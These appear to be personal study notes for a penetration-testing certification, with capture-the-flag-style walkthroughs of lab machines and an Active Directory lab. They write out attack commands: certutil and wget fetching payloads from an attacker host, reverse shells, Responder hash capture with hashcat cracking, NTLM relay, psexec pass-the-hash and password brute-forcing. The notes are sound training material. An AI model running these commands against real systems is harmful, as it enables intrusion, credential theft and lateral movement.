<img width="797" height="521" alt="image" src="https://github.com/user-attachments/assets/8c881cc4-8cef-433b-ba9e-ea445996caab" /># The Five Stages of Ethical Hacking

- [Reconnaissance](#-reconnaissance)
- [Scanning and Enumeration]
- [Gaining Access]
- [Maintaining Access]
- [Covering Tracks]


# Reconnaissance

## Passive Recon

| Location Information | Job information |
| ------------- | ------------- |
| Satellite images  | Employees (name, job title, phone number, manager,etc.)  |
| Drone recon  | Pictures (badge photos, desks photos, computer photos, etc.)  |
| Building layout (badge readers, break areas, security, fencing

## Active Recon
| Steps | Tools | Explanation|
| --- | --- | --- |
| Target validation | WHOIS, nslookup, dnsrecon | Ensure correct site/ip is given to attack |
| Finding Subdomains | Google Fu, dig, Nmap, Sub list3r, Bluto, crt.sh, etc. | subdomains increases attack surface area |
| Fingerprinting | Nmap, Wapplyzer, WhatWeb, BuiltWith, Netcat | Find what version and applications are running. eg. (FTP, Apache, etc.)
| Data breaches | HaveIBeenPwned, Breach-Parse, WeLeakInfo | find leaked usernames and credentials |

## Discovering Email Addresses
https://hunter.io/  
 
![image](https://github.com/yongquan1337/PNPT-notes/assets/65943569/906bf5f4-cd47-42ea-b03d-e4a20583166d)

https://phonebook.cz/

![image](https://github.com/yongquan1337/PNPT-notes/assets/65943569/8d3dd12f-33dc-413e-aae3-0c5079c37fb0)

others:  https://www.voilanorbert.com/      https://clearbit.com/resources/tools/connect

## Email verification
https://tools.emailhippo.com/

![image](https://github.com/yongquan1337/PNPT-notes/assets/65943569/145da6e4-1268-46a0-b025-138f5e8f1ba4)

https://email-checker.net/

![image](https://github.com/yongquan1337/PNPT-notes/assets/65943569/b45243c6-95c6-4ef7-b6ea-fbef6eefb2ed)

### Bonus
Gmail checks if user exists. use password recovery to find if the account is tied to another email

![image](https://github.com/yongquan1337/PNPT-notes/assets/65943569/5ab85440-682d-4663-970b-0eb8dbb72b72)


### Typical steps to find someone
1. Google: who is in this role in this company
2. go to hunter.io/phonebook.cz and identify the formatting of email and try to guesstimate their email
3. Verify Email using emailhippo/emailchecker


https://breachdirectory.org/
https://search.0t.rocks/
# Gathering Breached Credentials with Breach-Parse

# hunting subdomains

- sublist3r
- crt.sh
  ![image](https://github.com/yongquan1337/PNPT-notes/assets/65943569/c36dbedb-d3f5-4864-bb67-80c6bd2e3be1)
- amass
- burpsuite

# identify web tech

- builtwith.com
- wappalyzer (firefox extention)
- whatweb

# Google fu (googling using syntax)

https://ahrefs.com/blog/google-advanced-search-operators/

# kioptrix

user
john
TwoCows2

arp-scan -l
nmap -T4 -p- -A 192.168.79.24

nikto -h 192.168.79.24
gobuster dir -w /wordlist.txt -u http://192.168.79.24

###on kali add to /etc/samba/smbd.conf
[global]
client min protocol = CORE﻿
client max protocol = SMB3﻿﻿

\#systemctl restart smbd.service

## test smb

smbclient -L \\\\192.168.79.24\\
smbclient \\\\192.168.79.24\\ADMIN$
smbclient \\\\192.168.79.24\\IPC$


## ssh
ssh 192.168.79.24

if too old version then
ssh 192.168.79.24 -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes128-cbc

# reverse shell
![image](https://github.com/yongquan1337/PNPT-notes/assets/65943569/ffdaf0be-f722-46f8-97a6-dac9f5f1bfde)

![image](https://github.com/yongquan1337/PNPT-notes/assets/65943569/557b15fe-e68b-451e-af8d-d207547adb79)
reverse is preferred

# staged vs non staged payloads
![image](https://github.com/yongquan1337/PNPT-notes/assets/65943569/0c3bed1d-2187-4824-ad66-a9ca0fd8cb88)
staged and non staged marked by the "/" in the payload path
if staged doesnt work, try a non staged


## Blue VM
![image](https://github.com/yongquan1337/PNPT-notes/assets/65943569/03bf6bfa-0d5b-4581-a949-7d63228eb961)
![image](https://github.com/yongquan1337/PNPT-notes/assets/65943569/f94ae98a-4b61-4d51-ac6c-7aa84023c387)
![image](https://github.com/yongquan1337/PNPT-notes/assets/65943569/5cd346f7-4deb-4c4a-ace6-3164467fdf34)
![image](https://github.com/yongquan1337/PNPT-notes/assets/65943569/ce4a34c9-f827-4553-8d1e-430401e171dc)


## Academy
![image](https://github.com/user-attachments/assets/38a42a28-b060-4588-b1df-d227dabde110)
![image](https://github.com/user-attachments/assets/c474fa1b-debc-49da-a077-599591f5af4c)

![image](https://github.com/user-attachments/assets/0f24c288-9d97-4e73-9707-0b0e63b02546)
![image](https://github.com/user-attachments/assets/3ab4c257-6516-4607-809c-94c3c3f6171b)
![image](https://github.com/user-attachments/assets/d7f46e3f-2b26-4fd3-92b4-32da0731ea11)
![image](https://github.com/user-attachments/assets/43dea204-6ebf-46ec-b3f8-95fb25ff35bc)
![image](https://github.com/user-attachments/assets/c80302c8-431b-4367-aec4-547530187642)
![image](https://github.com/user-attachments/assets/8c4a2762-3ed2-40ed-9b0d-ec72a2728058)
![image](https://github.com/user-attachments/assets/ea878a07-c091-4783-8405-0794b6ed125a)
download pentestmonkey reversephpshell
![image](https://github.com/user-attachments/assets/cee21607-c3ce-46ef-903d-80f45bff44f1)

![image](https://github.com/user-attachments/assets/f2a8f0d7-45bd-4a7d-a27b-0f152cadd19b)

![image](https://github.com/user-attachments/assets/8ae8d330-1c8a-4892-adb5-545f2f73a79d)

![image](https://github.com/user-attachments/assets/dc05e11c-1b82-4e11-8290-600b32f62a80)

![image](https://github.com/user-attachments/assets/7eaf80da-73d3-4129-98a2-b941874c67c1)

![image](https://github.com/user-attachments/assets/7521dd15-4558-4920-ae9d-f7bcf8945bec)

![image](https://github.com/user-attachments/assets/a249172c-f81b-4a60-b34f-181761e992e5)

![image](https://github.com/user-attachments/assets/d2f0cee1-0055-4734-ba89-b245a853a2e9)

![image](https://github.com/user-attachments/assets/c319760f-5f44-410d-a5bc-e00bd5e948c2)

![image](https://github.com/user-attachments/assets/a1593235-12d7-414a-9e2b-3182c0772b6d)

![image](https://github.com/user-attachments/assets/1808941f-5b6a-4988-ab68-888fc4251428)

![image](https://github.com/user-attachments/assets/c826b541-983b-4343-adf5-77ce549f4da3)

![image](https://github.com/user-attachments/assets/47331558-47ab-4308-858f-d720ce75ed82)

![image](https://github.com/user-attachments/assets/24c7b221-8dde-4020-9989-afb8bf75242d)


## Dev

arp scan to discover vm ip address
![image](https://github.com/user-attachments/assets/29ac47df-e9b4-40b9-a79e-6c1a9cc0c755)

nmap -t4 -A 192.168.79.20
important ports are ssh,80,8080, and 2049(nfs network file sharing)
![image](https://github.com/user-attachments/assets/939f29ea-1de9-48be-bf54-3faa41548164)

incorrect bolt config
![image](https://github.com/user-attachments/assets/0675263b-70f3-4aa8-be9e-3a553f4309ea)

port 8080 is also on which shows the php info
![image](https://github.com/user-attachments/assets/b5615a55-e714-40ad-9aaf-4a695c692561)

gobusters finds the directories
port 80
![image](https://github.com/user-attachments/assets/a451fca4-57ca-433e-b64f-02ccf4cfed5a)
port 8080
![image](https://github.com/user-attachments/assets/6f0852da-4c00-4fb4-a6ce-4d574a00e74b)

after digging the directories (bolt, I_love_java)
![image](https://github.com/user-attachments/assets/4e7eae38-2eeb-4925-8625-a25eaff4b321)

In /app/config, found config.yml which confirms the credentials
![image](https://github.com/user-attachments/assets/b5de807b-931c-480f-9d57-73504a4732e3)

nfs mounting
![image](https://github.com/user-attachments/assets/4d11cf5d-bdff-4cf0-b7db-2a3956c4aee5)

aft apt install fcrackzip (-v verbose, -u unzip, -D dictionary attack, -p dictionary file) 
![image](https://github.com/user-attachments/assets/819ae07c-9f4b-4bc7-a918-4773f6870daa)

unzips file
![image](https://github.com/user-attachments/assets/b492f6dd-a376-4b40-997d-51fdf49a721e)

config files, goes by the initial jp
![image](https://github.com/user-attachments/assets/d67cfadd-f717-4659-a97e-fc4295279a3e)

went to port 8080/dev and goes to a bolt wire site, (bolt and I_love_java did not work, so just create a new account)
![image](https://github.com/user-attachments/assets/049ea83b-96eb-416a-9b97-91c2258b683d)

boltwire has exploits available
![image](https://github.com/user-attachments/assets/2d08889a-72a1-4f22-ab1f-d3af557f9217)

able to find user jeanpaul which matches the jp initial
![image](https://github.com/user-attachments/assets/012a126c-194f-4c9a-8cb1-616a168e82e1)

ssh using the id rsa from the zipped folder, used password I_love_java from above
![image](https://github.com/user-attachments/assets/2dae9420-773c-4806-9ead-b7bab35a8ed9)

sudo -l to find that /usr/bin/zip runs with sudo
![image](https://github.com/user-attachments/assets/9e68ac5c-1513-49a5-926a-ab0f1e6c761b)

gtfobins sudo,zip
![image](https://github.com/user-attachments/assets/73066718-e385-438e-9da6-93e60f8f9c56)

using gtfobins gets a root shell
![image](https://github.com/user-attachments/assets/2710303a-cf6f-4dad-bad0-2a7e6a8a7961)

flag
![image](https://github.com/user-attachments/assets/f06e18b9-54c4-41bc-b3fb-59dffb97fcda)

## butler

nmap scan (http ports on 8080 and 5357
![image](https://github.com/user-attachments/assets/7df2037d-e4f7-4081-b51b-3716be42de77)

go to http://192.168.79.21:8080 (note that https wont work)  

![image](https://github.com/user-attachments/assets/b28c87c2-f299-4f6b-9bc8-96c2344a92e8)

using burpsuite to get the login infos
![image](https://github.com/user-attachments/assets/c41e4a91-aefb-49f4-b48e-d37c90a3fd5b)

using hydra to crack the passwords. (userlist contains simple users such as admin, jenkins, user.)
-L userfile -P passwordfile -u(test all users) -f(until 1 is found) 192.168.79.21 -s (PORT) http-post-form "/login:user=^USER^&pass=^PASS^:F(failure condition)='Invalid'" (DID NOT WORK)
![image](https://github.com/user-attachments/assets/c41e4a91-aefb-49f4-b48e-d37c90a3fd5b)

using msfconsole jenkins aux payload.
![image](https://github.com/user-attachments/assets/8724b7d3-36ba-424c-b8f2-4d599e0af239)  
![image](https://github.com/user-attachments/assets/cf753402-7d67-48c0-822c-e9b960f58a18)

running aux
![image](https://github.com/user-attachments/assets/64f3710e-5537-479a-8f41-71f222258979)

after login, under manage jenkins => script console we can see that it can execute groovy script.
![image](https://github.com/user-attachments/assets/f1fc9800-a467-4c06-a9dc-1f5cbc251b85)
i run a groovy jenkins reverse shell i found on google and opened a listener 
![image](https://github.com/user-attachments/assets/ba64a6ee-5fb3-480d-870e-c09f2cedf8d5)

Download winpeas exe, put into transfer folder, run python3 http server  
![image](https://github.com/user-attachments/assets/90eedf01-87f2-4ba6-822a-c21a951866e1)  

use certutil to retrieve file (certutil.exe -urlcache -f http://attackermachineip/winPEASx64.exe winpeas.exe)
![image](https://github.com/user-attachments/assets/0ea2b50b-f028-4563-ae82-1cef8fa4471b)  

run by typing "winpeas.exe". no quotes and space detected means that the file is vulnerable to unquoted service path
![image](https://github.com/user-attachments/assets/e88d95e1-59a9-4700-af4b-e97ddf7f257a)

msfvenom create a reverse tcp shell on port 7777 and start web server
![image](https://github.com/user-attachments/assets/2552f695-765f-40cf-af29-12bb6f303202)  

go to c:/program files x64/Wise certutil -urlcache -f http://attackerip/Wise.exe Wise.exe
![image](https://github.com/user-attachments/assets/75a6ab5b-3732-4385-84c3-5e299f4b2e88)


nc -nlvp 7777
sc stop WiseBootAssistant
sc start WiseBootAssistant
![image](https://github.com/user-attachments/assets/012dbf46-012e-4067-94f8-c0769d9c44b4)
u have entered in admin
![image](https://github.com/user-attachments/assets/2c3f218b-4bda-4277-891e-1d201eb3d2a2)


### Blackpearl

nmap scan
![image](https://github.com/user-attachments/assets/8c04f774-8600-431d-b1a8-c550cf3ee95b)

gobuster found /secret
![image](https://github.com/user-attachments/assets/7b12c786-410d-4636-9b5b-04a1afb47d15)

Sike
![image](https://github.com/user-attachments/assets/6e0aa615-06f3-4cf0-81b8-6fa7cdbc89f6)

page source shows
![image](https://github.com/user-attachments/assets/aa517a24-0c1f-41c3-81b0-06738a32b336)

dnsrecon
![image](https://github.com/user-attachments/assets/b16bbb3b-9f97-4df5-a5bb-cac788b0d2ab)

edit /etc/hosts
![image](https://github.com/user-attachments/assets/07993d49-4bc5-427a-9b9d-fe362e20c416)

restart web browser and go to http://blackpearl.tcm
![image](https://github.com/user-attachments/assets/cfd1e276-8bc6-40a0-8b62-9f4068ebaeeb)

gobuster found /navigate
![image](https://github.com/user-attachments/assets/47ad00ac-45df-440a-a345-8ec86adf1169)

msfconsole
![image](https://github.com/user-attachments/assets/43f32b6e-bc8c-41e0-9b5b-9e90eeb8fd68)

meterpreter shell, which python shows python is installed. run python tty shell
![image](https://github.com/user-attachments/assets/bd19068a-b589-4b26-a659-2ba231d9e5a9)

host ur transfer file and use wget to put linpeas into victim machine.chmod to make it executable
![image](https://github.com/user-attachments/assets/e1c1b49e-6364-48f5-9de1-06a2899d0dd4)

unknown suid binary? if manually (find / -type f -perm -4000 2>/dev/null)
![image](https://github.com/user-attachments/assets/ae3a7f80-b011-4969-916a-0246df82baac)

use gtfo bins and search. php is in the list for suid
![image](https://github.com/user-attachments/assets/0dd16e00-2277-4210-8dcf-8c1220bdd4e8)
![image](https://github.com/user-attachments/assets/146845d3-56e8-4d85-bac0-61b1389e9d80)


### AD setup
Manage -> roles and features -> rolebased -> ... check AD domain services -> ... promote server to domain controller -> add a new forest (MARVEL.local) ->  install restart
Manage -> roles and features -> rolebased -> ... check AD certificate services -> ...validity 99 years -> .. reboot

Tools -> AD users and computers -> rightclick the DC -> new OU called group -> move everyt but administrator and guest into group
rightclick administrator copy -> Tony Stark (tstark) -> password never expire
repeat for Frank Castle and Peter Parker
rightclick administrator copy -> SQLService (SQLService) -> password never expire -> add password into description (bad service acc practice)

### shares
File and Storage services -> shares -> task,new share -> ... share name "hack me" -> ...create

### spn
cmd administrator -> setspn -a HYDRA-DC/SQLService.MARVEL.local:60111 MARVEL\SQLService
![image](https://github.com/user-attachments/assets/72605562-a21d-4cea-b8e5-f28628d533a6)
setspn -T MARVEL.local -Q /*/ (querys)
![image](https://github.com/user-attachments/assets/07e5b187-b1c6-43be-bf41-72ac54974541)

### AD groups
Group policy -> rightclick DC -> create a gpo (Disable Windows Defender) -> edit -> administrative templates -> windows component -> microsoft defender antivirus -> options turn off microsoft defender antivirus -> enable,apply,ok -> enforce policy

### AD users
change network adaptor to use AD as the preffered dns -> windows search access work or school -> connect -> join AD domain -> ... change account type to administrator
![image](https://github.com/user-attachments/assets/93c7ce91-83e5-4e09-afe5-aca9cc1b9634)

on THEPUNISHER, login to administrator -> edit local users and group -> users -> set password for Administrator (Password1!) -> double click enable
Group -> administrators -> add fcastle -> okapplyok
Open files -> network -> enable network file sharing on all vms

on SPIDERMAN do the exact same thing but in group administrators add both pparker and fcastle
log back in to local user .\peterparker -> folder -> thisPC -> computer -> map network drive -> folder: \\HYDRA-DC\hackme -> connect using different credentials -> verify with administrator
![image](https://github.com/user-attachments/assets/4cec93bc-b3e6-40a7-b004-ae87c372d330)


###AD responder

sudo responder -I eth0 -dwv

On windows machine file explorer type \\{kali ip}

(hash will be seen on kali machine, 5600 is the module, check from hashcat wiki"
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

<img width="586" height="77" alt="image" src="https://github.com/user-attachments/assets/fdd45a35-7785-494c-927a-c9587d3f5e18" />

###SMB

nmap --script=smb2-security-mode.nse -p445 {ip} -Pn

<img width="677" height="244" alt="image" src="https://github.com/user-attachments/assets/0cd3a401-3b3d-4e9e-bed6-021eaf54def9" />

sudo responder -I eth0 -dwv
targets.txt contains victims ip address
ntlmrelayx.py -tf targets.txt -smbsupport2

On windows machine file explorer type \\{kali ip}

<img width="797" height="521" alt="image" src="https://github.com/user-attachments/assets/61a13422-a393-4ff8-8933-70a771ff1335" />

ntlmrelayx.py -tf targets.txt -smbsupport2 -i

opens a shell. bind it using
nc {shell ip}
<img width="331" height="91" alt="image" src="https://github.com/user-attachments/assets/1098aac6-9ac0-4546-b1d8-824a7747b05b" />
use command "shares"

can use ntlmrelay -c to add new user 

SMB PREVENTION
<img width="750" height="651" alt="image" src="https://github.com/user-attachments/assets/d2530ceb-055f-457b-af76-788d44da537a" />

###Shell access

msfconsole
search psexec
find windows/smb/psexec
use 4
set payload windows/x64/meterpreter/reverse_tcp

<img width="528" height="142" alt="image" src="https://github.com/user-attachments/assets/3df96eb9-796f-4ad7-be43-c1d5b36a4057" />
run

I HAD TO DISABLE VIRUS PROTECTION ON WINDOWS VM

exploit local user administrator
unset smbdomain
set smbuser administrator
set smbpass HASH
hash retrieved from previous ntlmrelayx sam file

<img width="1347" height="488" alt="image" src="https://github.com/user-attachments/assets/d7dcde59-68f3-448c-84eb-f5c4866ccc53" />


MANUAL 
psexec.py MARVEL/fcastle:'Password1'@{ip}
psexec.py administrator@{ip} -hashes {HASH}
wmiexec/smbexec (alternatives)

